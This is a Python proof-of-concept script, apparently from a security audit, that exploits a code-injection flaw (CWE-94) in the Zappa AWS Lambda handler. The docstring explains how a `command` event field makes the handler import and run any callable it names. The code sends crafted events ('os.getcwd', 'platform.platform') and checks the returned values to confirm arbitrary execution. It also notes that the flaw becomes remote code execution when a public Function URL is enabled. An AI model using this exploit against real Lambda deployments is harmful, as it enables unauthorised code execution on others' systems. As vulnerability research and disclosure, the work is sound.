#!/usr/bin/env python3
"""VULN-002 — `command`/`task_path` event field → import + call arbitrary callable.

Vulnerable code : targets/Zappa/zappa/handler.py:906-912 (command branch)
                  sink targets/Zappa/zappa/utilities.py:146-153 (import_and_get_function)
Vulnerability   : CWE-94 Code Injection (arbitrary import + invocation).
Surface         : B (direct Lambda invocation — an AWS-authenticated caller, or,
                  via VULN-012's public Function URL, any AWS account).

Mechanism (plain English)
-------------------------
When an invocation event carries a `command` key, the handler does:

    whole_function = event["command"]
    app_function = self.import_module_and_get_function(whole_function)  # import + getattr
    result = self.run_function(app_function, event, context)            # call it

`import_and_get_function` splits the dotted string, `import_module`s the module,
and `getattr`s the attribute — with no allow-list. `run_function` then invokes
the resolved callable (trying `(event, context)`, then `(event)`, then `()`).
So the *event itself* names which module to import and which callable to run.

Exploitation idea
-----------------
Send `{"command": "<any.importable.callable>"}`. The chosen callable is imported
and executed inside the Lambda, and its return value is handed back to the
caller. `os.getcwd` discloses the server-side working directory; `platform.platform`
proves an arbitrary *other* module is imported and called. Combined with the
async path (asynchronous.py:288-322) the attacker also controls the args.

What a successful run proves
----------------------------
The event field selects and runs arbitrary in-process Python. Reachable
cross-account when a public Function URL is enabled (VULN-012), which makes this
a remote code-execution primitive; on its own it is a documented but powerful
direct-invoke footgun.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, log, raw_event, verdict

VULN = "VULN-002"


def main():
    banner(VULN, "command event field -> import + call arbitrary callable",
           "zappa/handler.py:906-912 -> utilities.py:146-153 import_and_get_function")

    # 1) os.getcwd — discloses the Lambda's working directory (proves invocation).
    log("STEP", 'sending {"command": "os.getcwd"} — attacker names the callable to run')
    r1 = raw_event({"command": "os.getcwd"})
    cwd = r1.get("result")
    log("INFO", f"handler returned os.getcwd() = {cwd!r}")

    # 2) platform.platform — a *different* module, proving arbitrary import+call, not a fixed API.
    log("STEP", 'sending {"command": "platform.platform"} — a different module entirely')
    r2 = raw_event({"command": "platform.platform"})
    plat = r2.get("result")
    log("INFO", f"handler returned platform.platform() = {plat!r}")

    got_cwd = isinstance(cwd, str) and cwd.startswith("/")
    got_plat = isinstance(plat, str) and len(plat) > 0 and cwd != plat

    if got_cwd and got_plat:
        log("PROOF", f"two unrelated modules (os, platform) were imported and invoked purely from the "
                     f"event's `command` field, returning live results ({cwd!r}, {plat!r}) — the event "
                     f"chooses which code runs in the Lambda.")
        log("OK", "exploit confirmed — arbitrary callable imported and executed from the event")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — event `command` -> arbitrary import+invoke (Surface B)")
        return 0
    log("FAIL", f"got_cwd={got_cwd} got_plat={got_plat} (cwd={cwd!r}, plat={plat!r})")
    verdict("FAILED", f"{VULN}: FAILED — command field did not resolve/execute a callable")
    return 1


if __name__ == "__main__":
    sys.exit(main())
